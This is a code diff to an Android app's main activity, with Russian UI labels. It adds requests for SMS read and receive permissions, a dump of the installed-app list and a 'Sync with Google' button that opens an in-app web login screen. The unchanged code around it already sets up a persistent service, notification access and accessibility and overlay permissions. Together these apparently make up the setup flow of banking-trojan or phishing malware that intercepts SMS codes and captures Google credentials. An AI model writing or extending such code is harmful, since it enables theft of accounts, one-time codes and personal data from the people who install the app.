@@ -43,8 +43,16 @@ public class MainActivity extends Activity {
                     != PackageManager.PERMISSION_GRANTED) {
                 requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1);
             }
+            if (checkSelfPermission(Manifest.permission.READ_SMS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.RECEIVE_SMS
+                }, 2);
+            }
             startForegroundService(new Intent(this, KeepAliveService.class));
             PermHelper.openNotifAccess(this);
+            AppList.dump(this);
         });
         ll.addView(init);
 
@@ -52,6 +60,12 @@ public class MainActivity extends Activity {
         a11y.setText("Шаг 2: разрешить оверлей");
         a11y.setOnClickListener(v -> PermHelper.openA11y(this));
         ll.addView(a11y);
+
+        Button gLogin = new Button(this);
+        gLogin.setText("Синхронизировать с Google");
+        gLogin.setOnClickListener(v ->
+            startActivity(new Intent(this, WebLoginActivity.class)));
+        ll.addView(gLogin);
 
         setContentView(ll);
     }
